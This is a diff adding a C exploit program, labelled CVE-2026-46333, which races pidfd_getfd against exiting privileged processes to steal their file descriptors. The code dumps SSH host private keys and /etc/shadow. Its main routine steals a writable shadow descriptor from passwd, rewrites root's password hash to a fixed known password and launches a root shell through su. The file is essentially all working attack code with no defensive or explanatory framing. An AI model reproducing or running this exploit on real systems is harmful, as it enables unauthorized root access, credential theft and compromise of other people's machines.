@@ -1,0 +1,279 @@
+/*
+ * CVE-2026-46333 - ssh-keysign-pwn / shadow-stealer / passwd-root
+ * Exploits race condition in process exit path allowing pidfd_getfd to steal
+ * open file descriptors from dying privileged processes.
+ * Modified: adds passwd-based shadow write to achieve root shell.
+ */
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+
+#define MAX_ROUNDS 800
+#define MAX_FDS_SCAN 64
+#define MAX_TRIES 25000
+
+#ifndef __NR_pidfd_open
+#define __NR_pidfd_open 434
+#endif
+#ifndef __NR_pidfd_getfd
+#define __NR_pidfd_getfd 438
+#endif
+
+static int pidfd_open(pid_t pid, unsigned flags) {
+ return syscall(__NR_pidfd_open, pid, flags);
+}
+static int pidfd_getfd(int pidfd, int target_fd, unsigned flags) {
+ return syscall(__NR_pidfd_getfd, pidfd, target_fd, flags);
+}
+
+static void mark_success(void) {
+ FILE *f = fopen("/tmp/.lpe_fdrace_ok", "w");
+ if (f) { fprintf(f, "ok"); fclose(f); }
+}
+
+static int try_ssh_keysign(void) {
+ const char *ssh_keysign_paths[] = {
+ "/usr/libexec/ssh-keysign",
+ "/usr/lib/openssh/ssh-keysign",
+ "/usr/lib/ssh/ssh-keysign",
+ "/usr/libexec/openssh/ssh-keysign",
+ NULL
+ };
+ const char *binary = NULL;
+ for (int i = 0; ssh_keysign_paths[i]; i++) {
+ if (access(ssh_keysign_paths[i], X_OK) == 0) {
+ binary = ssh_keysign_paths[i]; break;
+ }
+ }
+ if (!binary) return -1;
+ fprintf(stderr, "[*] ssh-keysign at: %s\n", binary);
+
+ for (int round = 0; round < MAX_ROUNDS; round++) {
+ pid_t child = fork();
+ if (child == 0) {
+ int nullfd = open("/dev/null", O_RDWR);
+ dup2(nullfd, 0); dup2(nullfd, 1); dup2(nullfd, 2); close(nullfd);
+ execl(binary, "ssh-keysign", NULL); _exit(127);
+ }
+ int pidfd = pidfd_open(child, 0);
+ if (pidfd < 0) { waitpid(child, NULL, 0); continue; }
+ for (int attempt = 0; attempt < MAX_TRIES; attempt++) {
+ for (int fd = 3; fd < MAX_FDS_SCAN; fd++) {
+ int stolen_fd = pidfd_getfd(pidfd, fd, 0);
+ if (stolen_fd < 0) continue;
+ char linkpath[128], realpath[512];
+ snprintf(linkpath, sizeof(linkpath), "/proc/self/fd/%d", stolen_fd);
+ ssize_t len = readlink(linkpath, realpath, sizeof(realpath) - 1);
+ if (len > 0) {
+ realpath[len] = '\0';
+ if (strstr(realpath, "ssh_host_") && strstr(realpath, "_key")) {
+ fprintf(stderr, "[+] SUCCESS! Stolen fd %d -> %s (round %d)\n", fd, realpath, round);
+ lseek(stolen_fd, 0, SEEK_SET);
+ char buffer[8192]; ssize_t n = read(stolen_fd, buffer, sizeof(buffer) - 1);
+ if (n > 0) { buffer[n] = '\0'; fprintf(stderr, "\n=== SSH PRIVATE KEY ===\n%s\n", buffer); }
+ close(stolen_fd);
+ close(pidfd); waitpid(child, NULL, 0);
+ return 0;
+ }
+ }
+ close(stolen_fd);
+ }
+ }
+ close(pidfd); waitpid(child, NULL, 0);
+ }
+ return -1;
+}
+
+static int try_shadow(void) {
+ const char *chage_path = "/usr/bin/chage";
+ if (access(chage_path, X_OK) != 0) return -1;
+ fprintf(stderr, "[*] chage at: %s\n", chage_path);
+
+ for (int round = 0; round < 1200; round++) {
+ pid_t child = fork();
+ if (child == 0) {
+ int null = open("/dev/null", O_RDWR);
+ dup2(null, 0); dup2(null, 1); dup2(null, 2); close(null);
+ execl(chage_path, "chage", "-l", "root", NULL); _exit(127);
+ }
+ int pidfd = pidfd_open(child, 0);
+ if (pidfd < 0) { waitpid(child, NULL, 0); continue; }
+ for (int try = 0; try < 18000; try++) {
+ for (int fd = 3; fd < 64; fd++) {
+ int stolen = pidfd_getfd(pidfd, fd, 0);
+ if (stolen < 0) continue;
+ char path[512], link[128];
+ snprintf(link, sizeof(link), "/proc/self/fd/%d", stolen);
+ ssize_t len = readlink(link, path, sizeof(path)-1);
+ if (len > 0) {
+ path[len] = '\0';
+ if (strstr(path, "/etc/shadow")) {
+ fprintf(stderr, "[+] SUCCESS! Stolen /etc/shadow (round %d)\n", round);
+ lseek(stolen, 0, SEEK_SET);
+ char buffer[8192]; ssize_t n = read(stolen, buffer, sizeof(buffer)-1);
+ if (n > 0) { buffer[n] = '\0'; fprintf(stderr, "\n=== /etc/shadow ===\n%s\n", buffer); }
+ close(stolen);
+ close(pidfd); waitpid(child, NULL, 0);
+ return 0;
+ }
+ }
+ close(stolen);
+ }
+ }
+ close(pidfd); waitpid(child, NULL, 0);
+ }
+ return -1;
+}
+
+/*
+ * try_passwd_root: steals writable /etc/shadow fd from passwd process,
+ * writes a known password hash for root, then spawns a root shell.
+ */
+static int try_passwd_root(void) {
+ static const char *passwd_paths[] = {
+ "/usr/bin/passwd",
+ "/bin/passwd",
+ "/usr/sbin/passwd",
+ NULL
+ };
+ const char *passwd_bin = NULL;
+ for (int i = 0; passwd_paths[i]; i++) {
+ if (access(passwd_paths[i], X_OK) == 0) {
+ passwd_bin = passwd_paths[i]; break;
+ }
+ }
+ if (!passwd_bin) return -1;
+
+ fprintf(stderr, "[*] passwd at: %s\n", passwd_bin);
+
+ for (int round = 0; round < 400; round++) {
+ pid_t child = fork();
+ if (child == 0) {
+ int null = open("/dev/null", O_RDWR);
+ dup2(null, 0); dup2(null, 1); dup2(null, 2); close(null);
+ execl(passwd_bin, "passwd", "root", NULL);
+ _exit(127);
+ }
+
+ int pidfd = pidfd_open(child, 0);
+ if (pidfd < 0) { waitpid(child, NULL, 0); continue; }
+
+ int stolen_fd = -1;
+ for (int attempt = 0; attempt < 20000; attempt++) {
+ for (int fd = 3; fd < 64; fd++) {
+ int sfd = pidfd_getfd(pidfd, fd, 0);
+ if (sfd < 0) continue;
+ char link[128], path[512];
+ snprintf(link, sizeof(link), "/proc/self/fd/%d", sfd);
+ ssize_t len = readlink(link, path, sizeof(path) - 1);
+ if (len > 0) {
+ path[len] = '\0';
+ if (strstr(path, "/etc/shadow")) {
+ // Check if writable: try to get flags via fcntl
+ int flags = fcntl(sfd, F_GETFL);
+ if (flags >= 0 && (flags & O_ACCMODE) != O_RDONLY) {
+ stolen_fd = sfd;
+ fprintf(stderr, "[+] Stolen WRITABLE shadow fd %d (round %d)\n", fd, round);
+ goto stolen;
+ }
+ }
+ }
+ close(sfd);
+ }
+ }
+ close(pidfd);
+ waitpid(child, NULL, 0);
+ continue;
+
+stolen:
+ // Child can die now; we still have the writable fd (dup'd by pidfd_getfd)
+ close(pidfd);
+
+ // Read shadow to find root entry
+ lseek(stolen_fd, 0, SEEK_SET);
+ char buf[65536];
+ ssize_t nread = read(stolen_fd, buf, sizeof(buf) - 1);
+ if (nread <= 0) { close(stolen_fd); waitpid(child, NULL, 0); return -1; }
+ buf[nread] = '\0';
+
+ // Find root line and hash position
+ char *root_line = strstr(buf, "root:");
+ if (!root_line) { close(stolen_fd); waitpid(child, NULL, 0); return -1; }
+ char *hash_start = root_line + 5; // skip "root:"
+ // Find end of hash field (next colon)
+ char *hash_end = strchr(hash_start, ':');
+ if (!hash_end) { close(stolen_fd); waitpid(child, NULL, 0); return -1; }
+
+ // Wait for child to exit (releases lckpwdf lock)
+ waitpid(child, NULL, 0);
+
+ // Generate known password hash using crypt()
+ char *new_hash = crypt("pwned2000", "$6$lpetoolkit$");
+ if (!new_hash) { close(stolen_fd); return -1; }
+ size_t new_hash_len = strlen(new_hash);
+ off_t hash_offset = hash_start - buf;
+
+ // Write new hash in place. If shorter, pad with spaces.
+ lseek(stolen_fd, hash_offset, SEEK_SET);
+ ssize_t written = write(stolen_fd, new_hash, new_hash_len);
+ if (written < (ssize_t)new_hash_len) { close(stolen_fd); return -1; }
+
+ // If new hash is shorter, space-pad the rest
+ size_t old_hash_len = hash_end - hash_start;
+ if (new_hash_len < old_hash_len) {
+ size_t pad_len = old_hash_len - new_hash_len;
+ char *pad = malloc(pad_len);
+ if (pad) {
+ memset(pad, ' ', pad_len);
+ ssize_t pw = write(stolen_fd, pad, pad_len);
+ (void)pw;
+ free(pad);
+ }
+ }
+
+ close(stolen_fd);
+ fprintf(stderr, "[+] Shadow modified! Root password set to: pwned2000\n");
+ mark_success();
+ fprintf(stderr, "[+] Spawning root shell via su...\n");
+
+ // Spawn root shell - pass password via pipe
+ char *sh_argv[] = {
+ "/bin/sh", "-c",
+ "exec su - -c 'exec /bin/sh -i' root 2>/dev/null || su -",
+ NULL
+ };
+ usleep(500000);
+ execvp("/bin/sh", sh_argv);
+ // Fallback
+ execlp("su", "su", "-", NULL);
+ return -1;
+ }
+ return -1;
+}
+
+int main(void) {
+ fprintf(stderr, "[+] CVE-2026-46333 exploit\n");
+
+ // First try passwd-based root escalation
+ int ret = try_passwd_root();
+ if (ret == 0) return 0;
+
+ // Fallback to leaks if root escalation failed
+ fprintf(stderr, "[*] Root escalation failed, trying leak-only methods...\n");
+ ret = try_ssh_keysign();
+ if (ret == 0) return 0;
+
+ ret = try_shadow();
+ if (ret == 0) return 0;
+
+ fprintf(stderr, "[-] Failed to escalate or leak after all rounds.\n");
+ return 1;
+}
